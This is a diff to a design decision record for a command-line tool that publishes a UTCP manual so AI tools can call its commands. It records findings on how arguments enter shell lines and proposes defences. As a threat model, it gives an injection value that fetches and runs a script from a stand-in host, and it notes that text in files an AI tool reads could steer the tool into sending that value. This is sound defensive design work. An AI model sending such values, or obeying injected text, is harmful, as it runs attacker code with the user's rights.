@@ -25,11 +25,31 @@ The command line already is the one core behind every answer, so the manual adds
 - Results stay on standard output, messages on standard error, with `--json` as the form an AI tool reads (rule X2, capability U8). Every call template ends in `--json`.
 - The manual does not change until `workbench manual` is run again, for example after an upgrade.
 
+## Findings
+
+A rough draft of the manual, from the public UTCP pages, is in [utcp-manual.md](../utcp-manual.md). It is tagged `TO_REFINE` throughout. The pages say:
+
+- A `cli` call template is a list of shell command lines. The client runs them in one generated script, and puts each argument where the command has `UTCP_ARG_<name>_UTCP_END`. The pages show the placeholder inside quotes the template author writes, warn against unsanitized input, and do not say that the client escapes values.
+- The result of a call is captured with `2>&1`, so standard error is mixed into it.
+- A client can load a manual by running a command that prints it, or from a file with a `text` call template.
+- A crate named `rs-utcp` exists. It has not been looked at.
+
+**Arguments are the risk that decides the design.** A tool argument is inserted into a line of shell. An AI tool can be steered, by text in the code or documents it reads, to send an argument such as `x"; curl evil | sh; echo "`. If the client inserts it as plain text, that runs as the user, and the rule that every command only reads (capability M3) holds for nothing. The explanation is in [utcp-manual.md](../utcp-manual.md#why-arguments-need-care).
+
+**Proposed, `TO_REFINE`:** quote every placeholder; allow-list every argument in the schema, with no `"`, `$`, backtick or `\`; make `workbench manual` refuse a template that breaks this; test it with a real shell; and try a real client once with an attack value before Release 1 ships (capability M8). If the client inserts values unchecked, the fallbacks are ids only, a local HTTP call template, a sandbox, or dropping the free-text tools. This ADR stays `proposed` until the client check is done.
+
+## Decided
+
+- The command is `workbench manual`, and the folder `init` writes is `ops/`. Both names are agreed by the project owner.
+- With `--json`, a command that succeeds writes nothing to standard error, because the client captures the result with `2>&1`. A test covers every query command.
+- Every argument of a tool is required in its schema, with a default, and `*` means no filter, because a call template is a fixed line and cannot leave an argument out. `node` splits into `node` and `file`, so the manual has eleven tools. Flags that are only present or absent stay on the command line. The default values are drafts.
+
 ## Open points
 
-Step 8, Task 1 settles the first three before any code is written.
+Step 8, Task 1 settles these before any code is written.
 
-- The exact UTCP version and manual format, and whether a Rust library exists or the manual is written by hand. The plan assumes a manual written by hand and has not checked the specification.
-- How a UTCP client passes arguments to a command: as a list of values, or as a string a shell reads. If it is a string, every argument needs quoting and the design must be reconsidered.
+- The exact UTCP version and manual fields: the draft uses what the examples show.
+- Whether a real client enforces the schema or inserts values faithfully, and whether standard error reaches the result as the pages say, whether an argument given at its default value is inserted as expected, and what happens to a call that runs past 120 seconds.
 - Whether a manual can carry anything for skills (K2). Proposed: the manual lists each skill with its file path and description, and the AI tool reads the file.
+- Whether `rs-utcp` is worth a crate.
 - Whether `status` should say that the manual was written by an older version of `workbench`.
